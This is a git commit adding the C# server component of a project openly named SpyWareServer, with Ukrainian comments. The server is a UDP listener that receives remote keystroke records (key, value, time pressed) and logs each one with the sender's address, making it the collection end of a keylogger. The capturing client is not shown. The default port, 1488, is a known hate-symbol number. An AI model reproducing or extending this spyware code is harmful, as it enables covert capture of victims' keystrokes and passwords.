f4070b844256abbd1825a02b76365fb8d95fe367
CeSiumUA <46378315+CeSiumUA@users.noreply.github.com>
2020-05-25 18:40:56 +0300

    reupload

---
+++ SpyWareServer/Program.cs
@@ -0,0 +1,30 @@
+﻿using Newtonsoft.Json;
+using System;
+
+namespace SpyWareServer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            UDP_Server();
+            Console.ReadLine();
+        }
+        private static void UDP_Server()
+        {
+            Console.WriteLine("Введіть локальний порт:");
+            int locPort = Convert.ToInt32(Console.ReadLine());
+            //Створюємо прослуховувач UDP пакетів на заданому порті
+            ServerInstance serverInstance = new ServerInstance(locPort);
+            serverInstance.UdpPacketRecievedEvent += (s, ipp) =>
+            {
+                var kstate = JsonConvert.DeserializeObject<KeyBoardInteractionInfo>(s);
+                Console.WriteLine("З Адреси: " + ipp);
+                Console.WriteLine("Клавіша: " + kstate.Key);
+                Console.WriteLine("Значення: " + kstate.Value);
+                Console.WriteLine("Час натискання: " + kstate.TimePressed);
+            };
+            serverInstance.Startlistener();
+        }
+    }
+}
---
+++ SpyWareServer/ServerInstance.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SpyWareServer
+{
+    public class ServerInstance
+    {
+        public int LocalPort = 1488;
+        private UdpClient UdpListener;
+        private bool Listen = true;
+        public delegate void UdpPacketReceivedHanlder(string text, IPEndPoint iPEndPoint);
+        public event UdpPacketReceivedHanlder UdpPacketRecievedEvent;
+        public ServerInstance(int LocalPort)
+        {
+            this.LocalPort = LocalPort;
+            UdpListener = new UdpClient(LocalPort);
+        }
+        public void Startlistener()
+        {
+            new Task(Listener).Start();
+        }
+        public void StopReceiver()
+        {
+            Listen = false;
+        }
+        private async void Listener()
+        {
+            while (Listen)
+            {
+                IPEndPoint senderIP = null;
+                UdpReceiveResult byteResult = await UdpListener.ReceiveAsync();
+                senderIP = byteResult.RemoteEndPoint;
+                UdpPacketRecievedEvent.Invoke(Encoding.Unicode.GetString(byteResult.Buffer), senderIP);
+                //Відправка відповіді, не дуже потрібна :)
+                //byte[] resp = Encoding.UTF8.GetBytes("response accepted!");
+                //UdpListener.Send(resp, resp.Length, senderIP);
+            }
+        }
+    }
+}
